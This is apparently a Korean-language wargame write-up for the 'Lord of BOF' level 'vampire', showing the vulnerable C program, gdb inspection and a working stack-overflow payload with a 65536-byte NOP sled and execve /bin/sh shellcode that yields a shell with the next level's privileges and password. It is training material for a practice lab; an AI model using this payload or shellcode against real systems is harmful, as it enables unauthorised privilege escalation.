@@ -1,0 +1,111 @@
+lob level8 풀기
+
+
+
+코드를 보자
+
+#include <stdio.h>
+#include <stdlib.h>
+
+main(int argc, char *argv[])
+{
+        char buffer[40];
+
+        if(argc < 2){
+                printf("argv error\n");
+                exit(0);
+        }
+
+        if(argv[1][47] != '\xbf')
+        {
+                printf("stack is still your friend.\n");
+                exit(0);
+        }
+
+        // here is changed!
+        if(argv[1][46] == '\xff')
+        {
+                printf("but it's not forever\n");
+                exit(0);
+        }
+
+        strcpy(buffer, argv[1]);
+        printf("%s\n", buffer);
+}
+
+
+1. memset이 없으므로 버퍼와 환경변수이용 등등 다 이용해서 공격이가능함.
+
+고로 쉘코드를 등록해 공격하는 기법을 써보자!!
+
+또는 주소를 찾아서 공격하는 기법도 가능
+
+
+그리고 제약이 하나 걸렸는데
+
+if(argv[1][46] == '\xff')
+        {
+                printf("but it's not forever\n");
+                exit(0);
+        }
+
+이 뜻은 bfff 이상의 주소를 사용하면 안된다 라는 뜻이다.
+즉 bffeffff 보다 작거나 같은 메모리 위치에 있는 값을 써야한다.
+
+
+높은 주소를 계산 하기 위해서 65536 을 이용
+
+한번 구해보자.
+
+(gdb) b*main+3
+Breakpoint 1 at 0x8048433
+(gdb) r `python -c 'print "A"*44+"\xbf\xbf\xbf\xbf" + "\x90"*65536'`
+Starting program: /home/troll/tmp/vampire `python -c 'print "A"*44+"\xbf\xbf\xbf\xbf" + "\x90"*65536'`
+
+Breakpoint 1, 0x8048433 in main ()
+(gdb) info reg ebp
+ebp            0xbffefad8       -1073808680
+
+주소값이 bffeffff 보다 더 내려갔다. 즉 
+
+그냥 bffeffff 값으로 65536개의 NOP 슬라이드를 넣어주고 쉘코드를 그 뒤에 넣어준다음
+적당한 위치의 ret주소를 사용하면 됨.
+
+
+~~~~~~~~~~
+
+
+./vampire `python -c 'print"A"*44 + "\xff\xff\xfe\xbf" +"\x90"*65536 +"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
+
+bash$ id
+uid=508(troll) gid=508(troll) groups=508(troll)
+bash$
+bash$
+
+
+뚫렸다 즉 쉘을 획득했다. 이상태로 그대로 본파일에 대입해보자
+
+@@@@@@@@@@@@@@@@@@@@@@@@@@
+
+./vampire `python -c 'print"A"*44 + "\xff\xff\xfe\xbf" +"\x90"*65536 +"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
+
+bash$ id
+uid=508(troll) gid=508(troll) euid=509(vampire) egid=509(vampire) groups=508(troll)
+bash$ my-pass
+euid = 509
+music world
+
+쉘을 획득했다.
+
+
+결론
+
+해당 조건을 보고 
+
+내가 이용해야할것들을 찾는다. 즉 ff가 막혔으므로 bffeffff 이하의 주소를 사용해야하므로
+gdb를 이용해 65536 번쨰 까지로 돌린다.
+
+그리고 info reg ebp  를 이용해 레지스터 주소 값을 획득한후 확인한다 여기서 주소값은 0xbffefad8 이므로
+bffeffff보다 낮으므로 대략 bffeffff로 잡고 공격을 진행해도 아무 무리가 없다 따라서 이대로 페이로드를 작성하면
+
+버퍼 + bffeffff + 공백(65536개) + 쉘코드  를 해주면 쉘을 획득 할수 있다.!
